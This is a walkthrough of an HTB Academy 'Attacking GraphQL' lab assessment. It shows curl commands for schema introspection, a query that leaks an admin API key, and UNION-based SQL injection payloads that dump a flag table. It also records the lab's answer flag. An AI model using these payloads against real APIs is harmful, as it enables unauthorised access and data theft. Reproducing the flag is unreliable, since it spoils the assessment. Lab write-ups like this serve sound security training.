# HTB Academy — Attacking GraphQL Skills Assessment

**Module:** Attacking GraphQL  
**Target:** `154.57.164.69:32767`  
**Flag:** `HTB{f1d663c11e6db634e1c9403d0e8e3a35}`

---

## Scenario

Recovera Systems — external pentest of a GraphQL API. The public website is in maintenance mode but the GraphQL API is fully active. Goal: identify and exploit vulnerabilities to obtain the flag.

---

## Attack Chain

### 1. Recon — Find the Endpoint

```bash
curl -s http://154.57.164.69:32767/
# Maintenance mode page

curl -s http://154.57.164.69:32767/static/js/app.js
# fetch('/graphql', ...) with query {allProducts { id name stock}}
# Confirms: GraphQL at /graphql
```

### 2. Introspection — Enumerate Schema (No Auth Required)

```bash
curl -s -X POST http://154.57.164.69:32767/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool
```

Custom types found: `EmployeeObject`, `ProductObject`, `ApiKeyObject`, `CustomerObject`  
Mutations: `AddEmployee`, `AddProduct`, `AddCustomer`

### 3. Query Available Queries

```bash
curl -s -X POST http://154.57.164.69:32767/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' | python3 -m json.tool
```

Queries: `allEmployees`, `employeeByUsername`, `allProducts`, `productByName`, `activeApiKeys`, `allCustomers`, `customerByName`

### 4. Information Disclosure — ApiKeyObject

Introspection revealed `ApiKeyObject` has `id`, `role`, `key` fields. Queried `activeApiKeys` directly (no auth):

```bash
curl -s -X POST http://154.57.164.69:32767/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ activeApiKeys { id role key } }"}' | python3 -m json.tool
```

Result:
- `role: guest` → `fbb64ce26fbe8a8d8d6895b8e6ba21a3`
- `role: guest` → `9cf8622bbc9fdc78f245663e08e5b4c1`
- `role: admin` → `0711a879ed751e63330a78a4b195bbad`

### 5. Discover apiKey-Gated Queries

Querying `allCustomers` without args returned error: `argument "apiKey" of type "String!" is required`. Used the admin API key:

```bash
curl -s -X POST http://154.57.164.69:32767/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ allCustomers(apiKey: \"0711a879ed751e63330a78a4b195bbad\") { firstName lastName address } }"}' \
  | python3 -m json.tool
# Returns customer list — confirms admin key works
```

### 6. SQL Injection Confirmation

`customerByName` requires `apiKey` and `lastName` args. Tested single quote injection:

```bash
# /tmp/q.json content:
# {"query":"{ customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"Blair'\") { firstName lastName address } }"}
```

Response: SQL syntax error revealing full query:
```sql
SELECT ... FROM customer WHERE lastName='Blair'' LIMIT ?
```
SQLi confirmed. `CustomerObject` has 4 fields → UNION needs 4 columns. `lastName` = column 3 (reflected).

### 7. UNION Exfiltration — Enumerate Tables

```
nano /tmp/q.json
```
Content:
```json
{"query":"{ customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=database()-- -\") { lastName } }"}
```

Result: `api_key,employee,flag,product,customer` — `flag` table found.

### 8. Enumerate `flag` Table Columns

```json
{"query":"{ customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='flag'-- -\") { lastName } }"}
```

Result: `id,flag`

### 9. Dump the Flag

```json
{"query":"{ customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"x' UNION SELECT 1,2,GROUP_CONCAT(flag),4 FROM flag-- -\") { lastName } }"}
```

Result: `HTB{f1d663c11e6db634e1c9403d0e8e3a35}`

---

## Key Lessons

1. **Introspection reveals the full attack surface** — always run it unauthenticated first, then authenticated. Here it exposed `ApiKeyObject` with a `key` field that could be queried directly.

2. **Query all custom types and their fields** — `ApiKeyObject` wasn't part of the frontend flow but was fully accessible via the API. Direct querying of `activeApiKeys` exposed the admin key with no auth.

3. **API keys found via introspection can unlock gated queries** — `allCustomers` and `customerByName` required an `apiKey` arg. The admin key obtained in step 4 unlocked them and opened the SQLi attack surface.

4. **UNION column count = object field count** — `CustomerObject` had 4 fields (id, firstName, lastName, address) → UNION needed 4 columns. `lastName` was field 3 → reflected at column position 3.

5. **Use nano for complex payloads** — when shell quoting becomes impossible, write the JSON directly with `nano /tmp/q.json` and reference it with `-d @/tmp/q.json`.

6. **Always check for a `flag` table** — after enumerating tables, look for `flag`, `secret`, `flags` before spending time on other tables.

---

## Techniques Used

| Technique | Where Applied |
|-----------|---------------|
| Unauthenticated introspection | Enumerated all types, fields, queries |
| Information disclosure | Queried `activeApiKeys` → admin API key |
| API key as query argument | Unlocked `allCustomers` and `customerByName` |
| SQL injection (UNION) | `customerByName(lastName:)` → flag table |
| nano for payload writing | Bypassed all shell quoting issues |
